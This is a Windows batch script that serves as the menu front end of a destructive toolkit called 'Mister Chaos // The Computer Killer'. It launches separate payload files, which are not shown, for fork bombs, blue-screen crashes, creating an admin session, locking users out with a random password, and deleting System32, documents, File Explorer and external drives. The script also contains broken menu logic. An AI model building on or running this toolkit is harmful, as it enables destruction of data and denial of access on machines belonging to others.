@echo off
cls
title Mister Chaos // The Computer Killer (By Webious_)
goto menu

REM MENU
:menu
color 04
cls
echo.
echo  [==========================================]
echo  #               Mister Chaos               #
echo  [==========================================]
echo  #  1. Bombing Attacks                      #
echo  #  2. Crash Attacks                        #
echo  #  3. Privilage Escalation                 #
echo  #  4. Destruction Attacks                  #
echo  #  5. Permanent Crash Attacks              #
echo  #  q. (EXIT)                               #
echo  [==========================================] 
echo                               By Webious_ (c)
echo   Enter Selection_

REM SelectMenu
set /p selectmenu=
if %selectmenu% == 1 goto menu_bombing
if %selectmenu% == 2 goto menu_crash
if %selectmenu% == 3 goto menu_privilage
if %selectmenu% == 4 goto menu_destruction
if %selectmenu% == 5 goto menu_permacrash
if %selectmenu% == q goto exit
) else (
goto menu
)

REM MENU_BOMBING_1
REM ==================================================================================================
:menu_bombing
color 0D
cls
echo.
echo  [==========================================]
echo  #             Bombing Attacks              #
echo  [==========================================]
echo  #  1. User Bombing                         #
echo  #  2. Folder Bombing                       #
echo  #  3. File Bombing                         #
echo  #  4. Browser Fork Bomb                    #
echo  #  5. CMD Fork Bomb                        #
echo  #  m. (Back to Main Menu)                  #
echo  [==========================================] 
echo.
echo   Enter Selection_

REM SelectMenu_Bombing
set /p SelectMenu_Bombing=
if %SelectMenu_Bombing% == 1 goto user_bombing
if %SelectMenu_Bombing% == 2 goto folder_bombing
if %SelectMenu_Bombing% == 3 goto file_bombing
if %SelectMenu_Bombing% == 4 goto browser_bombing
if %SelectMenu_Bombing% == 5 goto cmd_bombing
if %SelectMenu_Bombing% == m goto menu
) else (
goto menu_bombing
)

REM USER_BOMBING
:user_bombing
start user_bombing.bat
pause
goto menu_bombing

REM FOLDER_BOMBING
:folder_bombing
start folder_bombing.bat
pause
goto menu_bombing

REM FILE_BOMBING
:file_bombing
start file_bombing.bat
pause
goto menu_bombing

REM BROWSER_BOMBING
:browser_bombing
start browser_bombing.html
pause
goto menu_bombing

REM CMD_BOMBING
:cmd_bombing
start cmd_bombing.bat
pause
goto menu_bombing
REM ==================================================================================================

REM MENU_CRASH_2
REM ==================================================================================================
:menu_crash
color 0D
cls
echo.
echo  [==========================================]
echo  #             Crash Attacks                #
echo  [==========================================]
echo  #  1. Blue Screen                          #
echo  #  2. Spam Process                         #
echo  #  3. Porn Symphony                        #
echo  #  m. (Back to Main Menu)                  #
echo  [==========================================] 
echo.
echo   Enter Selection_

REM SelectMenu_Crash
set /p SelectMenu_Crash=
if %SelectMenu_Crash% == 1 goto bluescreen_crash
if %SelectMenu_Crash% == 2 goto spamprocess_crash
if %SelectMenu_Crash% == 3 goto porn_crash
if %SelectMenu_Crash% == m goto menu
) else (
goto menu_crash
)

REM BLUESCREEN_CRASH
:bluescreen_crash
start bluescreen_crash.bat
pause
goto menu_crash

REM SPAMPROCESS_CRASH
:spamprocess_crash
start spamprocess_crash.bat
pause
goto menu_crash

REM PORN_CRASH
:porn_crash
start porn_crash.bat
pause
goto menu_crash
REM ==================================================================================================

REM MENU_PRIVILAGE_3
REM ==================================================================================================
:menu_privilage
color 0D
cls
echo.
echo  [==========================================]
echo  #             Privilage Attacks            #
echo  [==========================================]
echo  #  1. New Admin Session                    #
echo  #  2. Lock out with random Password        #
echo  #  m. (Back to Main Menu)                  #
echo  [==========================================] 
echo.
echo   Enter Selection_

REM SelectMenu_Privilage
set /p SelectMenu_Privilage=
if %SelectMenu_Privilage% == 1 goto admin_privilage
if %SelectMenu_Escalation% == 2 goto passrandom_privilage
if %SelectMenu_Escalation% == 3 goto test
if %SelectMenu_Escalation% == m goto menu
) else (
goto menu_privilage
)

REM ADMIN_PRIVILAGE
:admin_privilage
start admin_privilage.bat
pause
goto menu_privilage

REM PASSRANDOM_PRIVILAGE
:passrandom_privilage
start passrandom_privilage.bat
pause
goto menu_privilage

REM TEST
:test
cd "/bin"
start test.bat
pause
goto menu_privilage
REM ==================================================================================================

REM MENU_DESTRUCTION_4
REM ==================================================================================================
:menu_destruction
color 0D
cls
echo.
echo  [==========================================]
echo  #            Destruction Attacks           #
echo  [==========================================]
echo  #  1. Delete Sys32                         #
echo  #  2. Delete all document files            #
echo  #  3. Delete File Explorer                 #
echo  #  4. Delete all External Drives           #
echo  #  m. (Back to Main Menu)                  #
echo  [==========================================] 
echo.
echo   Enter Selection_

REM SelectMenu_Destruction
set /p SelectMenu_Destruction=
if %SelectMenu_Destruction% == 1 goto sys32_destruction
if %SelectMenu_Destruction% == 2 goto delfile_destruction
if %SelectMenu_Destruction% == 3 goto explorer_destruction
if %SelectMenu_Destruction% == 4 goto drive_destruction
if %SelectMenu_Destruction% == m goto menu
) else (
goto menu_destruction
)

REM SYS32_DESTRUCTION
:sys32_destruction
start sys32_destruction.bat
pause
goto menu_destruction

REM DELFILE_DESTRUCTION
:delfile_destruction
start delfile_destruction.bat
pause
goto menu_destruction

REM EXPLORER_DESTRUCTION
:explorer_destruction
start explorer_destruction.bat
pause
goto menu_destruction

REM DRIVE_DESTRUCTION
:drive_destruction
start drive_destruction.bat
pause
goto menu_destruction
REM ==================================================================================================

REM MENU_PERMACRASH_5
REM ==================================================================================================
:menu_permacrash
color 0D
cls
echo.
echo  [==========================================]
echo  #          Permanent Crash Attacks         #
echo  [==========================================]
echo  #  1. Blue Screen (PERMA)                  #
echo  #  2. Spam Process (PERMA)                 #
echo  #  3. Explorer Crash (PERMA)               #
echo  #  m. (Back to Main Menu)                  #
echo  [==========================================] 
echo.
echo   Enter Selection_

REM SelectMenu_Permacrash
set /p SelectMenu_Permacrash=
if %SelectMenu_Permacrash% == 1 goto bluescreen_permacrash
if %SelectMenu_Permacrash% == 2 goto spamprocess_permacrash
if %SelectMenu_Permacrash% == 3 goto explorer_permacrash
if %SelectMenu_Permacrash% == m goto menu
) else (
goto menu_permacrash
)

REM BLUESCREEN_PERMACRASH
:bluescreen_permacrash
start bluescreen_permacrash.bat
pause
goto menu_permacrash

REM SPAMPROCESS_PERMACRASH
:spamprocess_permacrash
start spamprocess_permacrash.bat
pause
goto menu_permacrash

REM PORN_PERMACRASH
:explorer_permacrash
start explorer_permacrash.bat
pause
goto menu_crash
REM ==================================================================================================

REM EXIT
:exit
cls
exit /f
